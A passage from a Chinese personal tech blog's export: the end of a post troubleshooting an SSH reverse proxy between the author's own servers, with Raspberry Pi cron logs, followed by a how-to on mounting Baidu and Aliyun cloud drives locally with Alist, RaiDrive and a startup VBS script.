1)</span><br><span class="line">Jun 17 03:00:01 raspbian CRON[1085]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 03:05:01 raspbian CRON[1675]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 03:15:01 raspbian CRON[2693]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 03:17:01 raspbian CRON[2906]: (root) CMD (   <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly)</span><br><span class="line">Jun 17 03:20:01 raspbian CRON[3229]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 03:25:01 raspbian CRON[3784]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 03:35:01 raspbian CRON[4811]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 03:40:01 raspbian CRON[5313]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 03:45:01 raspbian CRON[5858]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 03:55:01 raspbian CRON[6922]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 04:00:01 raspbian CRON[7425]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 04:05:01 raspbian CRON[7974]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 04:15:01 raspbian CRON[8973]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 04:17:01 raspbian CRON[9173]: (root) CMD (   <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly)</span><br><span class="line">Jun 17 04:20:01 raspbian CRON[9480]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 04:25:01 raspbian CRON[10021]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 04:35:01 raspbian CRON[11045]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 04:40:02 raspbian CRON[11545]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 04:45:01 raspbian CRON[12093]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 04:55:01 raspbian CRON[13117]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 05:00:01 raspbian CRON[13619]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 05:05:01 raspbian CRON[14155]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 05:15:01 raspbian CRON[15165]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 05:17:01 raspbian CRON[15366]: (root) CMD (   <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly)</span><br><span class="line">Jun 17 05:20:01 raspbian CRON[15672]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 05:25:01 raspbian CRON[16215]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 05:35:01 raspbian CRON[17250]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 05:40:01 raspbian CRON[17746]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 05:45:01 raspbian CRON[18285]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 05:55:01 raspbian CRON[19301]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 06:00:01 raspbian CRON[19800]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 06:05:01 raspbian CRON[22560]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 06:15:01 raspbian CRON[23560]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 06:17:01 raspbian CRON[23760]: (root) CMD (   <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly)</span><br><span class="line">Jun 17 06:20:01 raspbian CRON[24067]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 06:25:01 raspbian CRON[24615]: (root) CMD (<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily ))</span><br><span class="line">Jun 17 06:25:01 raspbian CRON[24616]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 06:25:02 raspbian cracklib: no dictionary update necessary.</span><br><span class="line">Jun 17 06:35:01 raspbian CRON[25732]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 06:40:01 raspbian CRON[26237]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 06:45:01 raspbian CRON[26777]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 06:55:01 raspbian CRON[27789]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 07:00:01 raspbian CRON[28292]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 07:05:01 raspbian CRON[28833]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 06:17:02 raspbian cron[412]: (CRON) INFO (pidfile fd = 3)</span><br><span class="line">Jun 17 06:17:02 raspbian cron[412]: (CRON) INFO (Running @reboot <span class="built_in">jobs</span>)</span><br><span class="line">Jun 17 06:17:03 raspbian CRON[569]: (root) CMD (mount --<span class="built_in">bind</span> /configuration /www/wwwroot/orange/mount_disk/)</span><br><span class="line">Jun 17 06:17:03 raspbian CRON[570]: (root) CMD (/configuration/script/ssh_reverse_proxy_daemon.sh)</span><br><span class="line">Jun 17 06:17:03 raspbian CRON[572]: (root) CMD (/configuration/script/ssh_reverse_proxy.sh )</span><br><span class="line">Jun 17 07:56:17 raspbian CRON[5396]: (root) CMD (<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily ))</span><br><span class="line">Jun 17 07:56:17 raspbian cracklib: no dictionary update necessary.</span><br><span class="line">Jun 17 08:00:01 raspbian CRON[7985]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 08:05:01 raspbian CRON[8241]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 08:15:01 raspbian CRON[8717]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 08:17:01 raspbian CRON[8839]: (root) CMD (   <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly)</span><br><span class="line">Jun 17 08:20:01 raspbian CRON[8995]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 08:25:01 raspbian CRON[9252]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 08:35:01 raspbian CRON[9750]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 08:40:01 raspbian CRON[10002]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 08:45:01 raspbian CRON[10263]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 08:55:01 raspbian CRON[10760]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 09:00:01 raspbian CRON[11020]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 09:05:01 raspbian CRON[11280]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 09:15:01 raspbian CRON[11749]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 09:17:01 raspbian CRON[11863]: (root) CMD (   <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly)</span><br><span class="line">Jun 17 09:20:01 raspbian CRON[12055]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 09:25:01 raspbian CRON[12401]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 09:35:01 raspbian CRON[12917]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 09:40:01 raspbian CRON[13202]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 09:45:01 raspbian CRON[13470]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 09:47:36 raspbian cron[409]: (CRON) INFO (pidfile fd = 3)</span><br><span class="line">Jun 17 09:47:36 raspbian cron[409]: (CRON) INFO (Running @reboot <span class="built_in">jobs</span>)</span><br><span class="line">Jun 17 09:47:37 raspbian CRON[571]: (root) CMD (/configuration/script/ssh_reverse_proxy_daemon.sh)</span><br><span class="line">Jun 17 09:47:37 raspbian CRON[574]: (root) CMD (mount --<span class="built_in">bind</span> /configuration /www/wwwroot/orange/mount_disk/)</span><br><span class="line">Jun 17 09:47:37 raspbian CRON[575]: (root) CMD (/configuration/script/ssh_reverse_proxy.sh )</span><br><span class="line">Jun 17 09:55:01 raspbian CRON[7749]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 10:00:01 raspbian CRON[8058]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 10:05:01 raspbian CRON[8425]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 10:15:01 raspbian CRON[8920]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 10:17:01 raspbian CRON[9018]: (root) CMD (   <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly)</span><br><span class="line">Jun 17 10:20:01 raspbian CRON[9186]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 10:25:01 raspbian CRON[9438]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 10:35:01 raspbian CRON[9927]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 10:40:01 raspbian CRON[10189]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 10:45:01 raspbian CRON[10449]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 10:55:01 raspbian CRON[10928]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 11:00:01 raspbian CRON[11180]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 11:05:01 raspbian CRON[11439]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 11:15:01 raspbian CRON[12987]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 11:17:01 raspbian CRON[13086]: (root) CMD (   <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly)</span><br><span class="line">Jun 17 11:20:01 raspbian CRON[13246]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 11:25:01 raspbian CRON[13507]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 11:35:01 raspbian CRON[13994]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 11:40:01 raspbian CRON[14264]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 11:45:01 raspbian CRON[14596]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 11:55:01 raspbian CRON[15063]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 12:00:01 raspbian CRON[15319]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 12:05:01 raspbian CRON[15572]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 12:15:01 raspbian CRON[16062]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 12:17:01 raspbian CRON[16156]: (root) CMD (   <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly)</span><br><span class="line">Jun 17 12:20:01 raspbian CRON[16328]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 12:25:01 raspbian CRON[16584]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 12:35:01 raspbian CRON[17183]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 12:40:01 raspbian CRON[17629]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 12:43:45 raspbian cron[379]: (CRON) INFO (pidfile fd = 3)</span><br><span class="line">Jun 17 12:43:45 raspbian cron[379]: (CRON) INFO (Running @reboot <span class="built_in">jobs</span>)</span><br><span class="line">Jun 17 12:43:45 raspbian CRON[518]: (root) CMD (/configuration/script/ssh_reverse_proxy.sh )</span><br><span class="line">Jun 17 12:43:45 raspbian CRON[519]: (root) CMD (/configuration/script/ssh_reverse_proxy_daemon.sh)</span><br><span class="line">Jun 17 12:43:45 raspbian CRON[520]: (root) CMD (mount --<span class="built_in">bind</span> /configuration /www/wwwroot/orange/mount_disk/)   <span class="comment">#这是我的一个挂载命令，不构成影响。</span></span><br><span class="line">Jun 17 12:45:03 raspbian CRON[7329]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><code>检查服务器B防火墙</code></p>
<p><img src="/2022/08/09/ssh%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/image-20220617125728813.png" alt="image-20220617125728813"></p>
<p>A服务器</p>
<p><img src="/2022/08/09/ssh%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/image-20220617130523176.png" alt="image-20220617130523176"></p>
<p>B服务器</p>
<p><img src="/2022/08/09/ssh%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/image-20220617130544082.png" alt="image-20220617130544082"></p>
<h4 id="猜想"><a href="#猜想" class="headerlink" title="猜想"></a>猜想</h4><p>1.我的朋友说可能是网络问题，毕竟是国外的服务器，连接过去可能出现丢包。</p>
<p>我的解释是ssh反代基于tcp&#x2F;ip连接，还是比较可靠的，如果是丢包的话它也会继续发送重连，而且服务器B没有被<code>GFW</code>封杀，我也可以ssh到B服务器上面，理论上我应该是可以反代成功的。</p>
<p>2.我曾经换过内核，令服务器B能够开启bbr极限压缩带宽的使用，我不清楚这个是否构成失败原因。</p>
]]></content>
      <categories>
        <category>Linux系统</category>
      </categories>
      <tags>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>好玩的黑科技</title>
    <url>/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="系统挂载网盘"><a href="#系统挂载网盘" class="headerlink" title="系统挂载网盘"></a>系统挂载网盘</h1><p><strong><a href="https://github.com/alist-org/alist">Alist 开源项目地址</a></strong></p>
<p><strong><a href="https://www.raidrive.com/">raidrive网址</a></strong></p>
<p><strong><a href="https://potplayer.daum.net/">potplayer播放器网址</a></strong></p>
<h3 id="Alist"><a href="#Alist" class="headerlink" title="Alist"></a><strong>Alist</strong></h3><p>下载好win版本的Alist之后解压，把文件夹复制到指定的盘里面，这里我复制到D盘。</p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/image-20230107212820780.png" alt="image-20230107212820780"></p>
<p><strong>进入到文件夹里面，在地址栏输入<code>cmd</code>然后回车等待<code>cmd</code>弹出。</strong></p>
<p><strong>在命令行中输入<code>alist serverrh</code>然后回车</strong></p>
<p><strong>服务启动后，命令行里面会有一串密钥，记得复制它，然后打开浏览器输入<code>127.0.0.1:5244</code></strong></p>
<ul>
<li><p><strong>账号：admin</strong></p>
</li>
<li><p><strong>密码：命令行出现的那一串密钥</strong></p>
</li>
</ul>
<p><strong>打开页面后下方有个管理，需要修改一下admin的密码，方便后面使用</strong></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/image-20230107213441904.png" alt="image-20230107213441904"></p>
<h3 id="百度网盘"><a href="#百度网盘" class="headerlink" title="百度网盘"></a><strong>百度网盘</strong></h3><p><strong>首先需要获取到 刷新令牌</strong></p>
<p><strong>登入你的百度网盘以后， 再【<a href="https://openapi.baidu.com/oauth/2.0/authorize?response_type=code&client_id=iYCeC9g08h5vuP9UqvPHKKSVrKFXGa1v&redirect_uri=https://tool.nn.ci/baidu/callback&scope=basic,netdisk&qrcode=1">点击这里</a>】来获取刷新令牌<code>refresh_token</code></strong></p>
<p><strong>获取完成之后，点击存储添加百度网盘,<code>挂载路径:/百度网盘</code>,<code>刷新令牌:refresh_token</code>，<code>WebDAV策略:本地代理</code>,<code>打开web代理</code>，<code>根文件夹路径:/</code>然后保存即可</strong></p>
<p><strong>注意几点：</strong></p>
<ul>
<li><strong>要挂载的根文件夹，默认为<code>/</code>，与本地存储相同。</strong></li>
</ul>
<p><strong>Download API</strong></p>
<ul>
<li><strong>official: 官方接口，很稳定，但是文件比较大，需要修改UA，速度慢</strong></li>
<li><strong>crack: 非官方接口，无需修改UA且部分文件可能不限速，但是可能会不稳定</strong></li>
</ul>
<h3 id="阿里云盘"><a href="#阿里云盘" class="headerlink" title="阿里云盘"></a><strong>阿里云盘</strong></h3><p><strong>首先我们需要获取到阿里云盘的 refresh_token</strong></p>
<ul>
<li><strong><a href="https://easy-token.cooluc.com/">傻瓜方法</a></strong></li>
</ul>
<p><strong>获取完成之后，点击存储添加阿里云盘,<code>挂载路径:/阿里云盘</code>,<code>刷新令牌:refresh_token</code>，<code>WebDAV策略:本地代理</code>,<code>打开web代理</code>，<code>根文件夹ID:root</code>，<code>排序和排序方式自己选择</code>,<code>打开秒传</code>,然后保存即可</strong></p>
<h3 id="RaiDrive"><a href="#RaiDrive" class="headerlink" title="RaiDrive :"></a><strong>RaiDrive :</strong></h3><p><strong>官网：<a href="http://www.raidrive.com/">www.raidrive.com</a> (免费版即可)</strong></p>
<p><strong>照着打会吧！记得把地址这个选项去掉</strong></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/image-20230107211852239.png" alt="image-20230107211852239"></p>
<h3 id="vbs脚本内容"><a href="#vbs脚本内容" class="headerlink" title="vbs脚本内容"></a><strong>vbs脚本内容</strong></h3><p><strong>创建一个<code>aliststart.vbs</code>文件</strong></p>
<figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Set</span> ws = <span class="built_in">CreateObject</span>(<span class="string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="line">ws.run <span class="string">&quot;D:\alist-windows-amd64\alist.exe server&quot;</span>,vbhide</span><br></pre></td></tr></table></figure>

<p><strong>把这个vbs后缀文件丢开机启动项</strong></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/image-20230107211344345.png" alt="image-20230107211344345"></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/image-20230107211507269.png" alt="image-20230107211507269"></p>
<h3 id="最后的样子"><a href="#最后的样子" class="headerlink" title="最后的样子"></a><strong>最后的样子</strong></h3><p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/image-20230107214958173.png" alt="image-20230107214958173"></p>
